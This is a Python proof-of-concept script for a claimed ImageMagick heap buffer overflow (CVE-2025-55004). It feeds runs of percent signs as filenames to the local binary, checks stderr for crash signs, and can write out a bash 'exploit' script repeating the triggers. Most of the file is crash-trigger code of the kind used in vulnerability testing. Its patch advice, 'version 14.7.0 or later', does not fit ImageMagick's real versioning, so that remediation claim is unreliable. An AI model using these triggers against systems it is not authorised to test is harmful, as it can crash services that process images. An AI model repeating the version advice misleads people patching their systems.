#!/usr/bin/env python3

"""
CVE-2025-55004 - ImageMagick Heap Buffer Overflow POC
Demonstrates heap buffer overflow in InterpretImageFilename function
when processing consecutive percent signs in filename format strings.
"""

import subprocess
import sys
import os
import tempfile
from pathlib import Path
import argparse
import logging


class CVE202555004POC:
    """Proof of Concept for CVE-2025-55004 ImageMagick vulnerability."""
    
    def __init__(self, magick_path: str = None):
        self.magick_path = magick_path or self._find_magick()
        self.logger = self._setup_logger()
        
    def _setup_logger(self) -> logging.Logger:
        """Configure and return logger instance."""
        logger = logging.getLogger(__name__)
        if not logger.handlers:
            handler = logging.StreamHandler(sys.stderr)
            formatter = logging.Formatter(
                '%(asctime)s - %(levelname)s - %(message)s'
            )
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger
    
    def _find_magick(self) -> str:
        """Find ImageMagick binary in system PATH."""
        possible_names = ['magick', 'convert', 'ImageMagick']
        
        for name in possible_names:
            if subprocess.run(['which', name], capture_output=True).returncode == 0:
                return name
                
        # Try common installation paths
        common_paths = [
            '/usr/bin/magick',
            '/usr/local/bin/magick',
            '/opt/ImageMagick/bin/magick',
        ]
        
        for path in common_paths:
            if Path(path).exists():
                return path
                
        raise FileNotFoundError(
            "ImageMagick binary not found. Please specify path with --magick-path"
        )
    
    def check_vulnerability(self) -> bool:
        """
        Check if the ImageMagick installation is vulnerable.
        
        Returns:
            True if vulnerable, False if patched
        """
        try:
            # Run version check first
            result = subprocess.run(
                [self.magick_path, '-version'], 
                capture_output=True, 
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                self.logger.info(f"ImageMagick version info:\n{result.stdout}")
            
            # Test the vulnerability trigger
            self.logger.info("Testing vulnerability trigger...")
            
            with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp:
                test_result = subprocess.run(
                    [self.magick_path, '%%', tmp.name],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                
                # Clean up temp file
                try:
                    os.unlink(tmp.name)
                except:
                    pass
                
                # Check for crash indicators
                if test_result.returncode != 0:
                    error_output = test_result.stderr.lower()
                    
                    # Look for crash indicators
                    crash_indicators = [
                        'segmentation fault',
                        'heap-buffer-overflow',
                        'addresssanitizer',
                        'abort',
                        'signal',
                        'core dumped'
                    ]
                    
                    if any(indicator in error_output for indicator in crash_indicators):
                        self.logger.warning("Vulnerability confirmed - crash detected!")
                        self.logger.info(f"Error output: {test_result.stderr}")
                        return True
                    else:
                        self.logger.info("No crash detected, likely patched")
                        return False
                else:
                    self.logger.info("Command executed successfully, likely patched")
                    return False
                    
        except subprocess.TimeoutExpired:
            self.logger.warning("Command timed out - possible crash")
            return True
        except FileNotFoundError:
            self.logger.error(f"ImageMagick binary not found: {self.magick_path}")
            return False
        except Exception as e:
            self.logger.error(f"Error during vulnerability check: {e}")
            return False
    
    def generate_test_payloads(self) -> list:
        """
        Generate various payload formats that trigger the vulnerability.
        
        Returns:
            List of payload strings to test
        """
        payloads = [
            '%%',           # Basic trigger
            '%%%',          # Extended trigger
            '%%%%',         # Multiple consecutive %
            '%%%%%',        # Even more %
            '%%test',       # With suffix
            'test%%',       # With prefix
            'test%%test',   # Surrounded
            '%%' + 'A' * 100,  # With long suffix
        ]
        return payloads
    
    def run_comprehensive_test(self) -> None:
        """Run comprehensive testing with multiple payload variations."""
        self.logger.info("Running comprehensive vulnerability test...")
        
        payloads = self.generate_test_payloads()
        vulnerable_count = 0
        
        for i, payload in enumerate(payloads):
            self.logger.info(f"Testing payload {i+1}/{len(payloads)}: '{payload}'")
            
            try:
                with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp:
                    result = subprocess.run(
                        [self.magick_path, payload, tmp.name],
                        capture_output=True,
                        text=True,
                        timeout=5
                    )
                    
                    # Clean up
                    try:
                        os.unlink(tmp.name)
                    except:
                        pass
                    
                    if result.returncode != 0:
                        error_output = result.stderr.lower()
                        
                        if any(indicator in error_output for indicator in [
                            'segmentation fault', 'heap-buffer-overflow', 
                            'addresssanitizer', 'abort', 'signal'
                        ]):
                            self.logger.warning(f"Payload '{payload}' triggered crash!")
                            vulnerable_count += 1
                        else:
                            self.logger.info(f"Payload '{payload}' failed but no crash")
                    else:
                        self.logger.info(f"Payload '{payload}' executed successfully")
                        
            except subprocess.TimeoutExpired:
                self.logger.warning(f"Payload '{payload}' caused timeout - possible crash")
                vulnerable_count += 1
            except Exception as e:
                self.logger.error(f"Error testing payload '{payload}': {e}")
        
        if vulnerable_count > 0:
            self.logger.warning(
                f"VULNERABLE: {vulnerable_count}/{len(payloads)} payloads "
                f"triggered crashes"
            )
        else:
            self.logger.info("No vulnerabilities detected - system appears patched")
    
    def create_sample_exploit(self, output_file: str = None) -> str:
        """
        Create a sample script that demonstrates the vulnerability.
        
        Args:
            output_file: Optional path for output script
            
        Returns:
            Path to created exploit script
        """
        if not output_file:
            output_file = 'cve-2025-55004-exploit.sh'
        
        exploit_script = f'''#!/bin/bash
# CVE-2025-55004 ImageMagick Heap Buffer Overflow Exploit
# This script demonstrates the vulnerability in ImageMagick's InterpretImageFilename function

echo "Testing CVE-2025-55004 - ImageMagick Heap Buffer Overflow"
echo "Target: {self.magick_path}"
echo ""

# Basic vulnerability trigger
echo "Running basic trigger: '%%'"
{self.magick_path} %% /tmp/test_output.png

# Extended triggers
echo ""
echo "Running extended triggers..."
{self.magick_path} %%% /tmp/test_output2.png
{self.magick_path} %%%% /tmp/test_output3.png

# Clean up
rm -f /tmp/test_output*.png

echo ""
echo "If crashes occurred, the system is vulnerable to CVE-2025-55004"
echo "Update ImageMagick to version 14.7.0 or later to patch this vulnerability"
'''
        
        with open(output_file, 'w') as f:
            f.write(exploit_script)
        
        # Make executable
        os.chmod(output_file, 0o755)
        
        self.logger.info(f"Exploit script created: {output_file}")
        return output_file


def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description='CVE-2025-55004 ImageMagick Heap Buffer Overflow POC',
        epilog='This tool tests for the heap buffer overflow vulnerability in '
               'ImageMagick\'s InterpretImageFilename function.'
    )
    
    parser.add_argument(
        '--magick-path',
        help='Path to ImageMagick binary (auto-detected if not specified)'
    )
    parser.add_argument(
        '--comprehensive',
        action='store_true',
        help='Run comprehensive testing with multiple payloads'
    )
    parser.add_argument(
        '--create-exploit',
        metavar='SCRIPT_PATH',
        help='Create a sample exploit script at the specified path'
    )
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Enable verbose logging'
    )
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    try:
        poc = CVE202555004POC(args.magick_path)
        
        if args.create_exploit:
            poc.create_sample_exploit(args.create_exploit)
            return
        
        # Run basic vulnerability check
        is_vulnerable = poc.check_vulnerability()
        
        if args.comprehensive:
            poc.run_comprehensive_test()
        
        if is_vulnerable:
            print("\n[!] SYSTEM APPEARS VULNERABLE TO CVE-2025-55004")
            print("[!] Update ImageMagick to version 14.7.0 or later")
            sys.exit(1)
        else:
            print("\n[+] System appears to be patched against CVE-2025-55004")
            sys.exit(0)
            
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)


if __name__ == '__main__':
    main()
